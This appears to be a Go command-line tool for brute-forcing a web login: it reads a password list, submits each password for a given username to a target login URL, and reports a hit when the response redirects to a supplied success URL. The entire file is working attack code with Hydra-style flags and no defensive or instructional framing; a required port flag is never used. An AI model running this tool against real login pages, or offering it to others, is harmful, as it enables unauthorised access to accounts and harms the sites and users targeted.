package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func bruteForceAttack(username string, passwordList []string, url, successURL string, port int) {
	var client = &http.Client{
		Timeout: 10 * time.Second,
	}

	for _, password := range passwordList {
		fmt.Printf("Attempting with password: %s\n", password)

		data := fmt.Sprintf("username=%s&password=%s", username, password)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(data)))
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			continue
		}

		// Set headers
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			continue
		}

		// Check if redirected to success URL
		if resp.Request.URL.String() == successURL {
			fmt.Printf("KEY FOUND: %s\n", password)
			return
		} else {
			fmt.Printf("Failed attempt with password: %s\n", password)
		}
		resp.Body.Close()
	}

	fmt.Println("KEY NOT FOUND")
}

func main() {
	// Command-line arguments
	username := flag.String("l", "", "Target username")
	passwordFile := flag.String("P", "", "Path to password list file")
	url := flag.String("url", "", "Target login URL")
	successURL := flag.String("redirect", "", "Success URL (redirect to this URL when successful)")
	port := flag.Int("port", 0, "Port of the target server")
	flag.Parse()

	// Validate arguments
	if *username == "" || *passwordFile == "" || *url == "" || *successURL == "" || *port == 0 {
		fmt.Println("Usage: -l <username> -P <password list file> <url> --redirect <success URL> --port <port>")
		return
	}

	// Read password list
	file, err := os.Open(*passwordFile)
	if err != nil {
		fmt.Println("Password list file not found.")
		return
	}
	defer file.Close()

	var passwordList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwordList = append(passwordList, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
		return
	}

	// Start brute-force attack
	bruteForceAttack(*username, passwordList, *url, *successURL, *port)
}
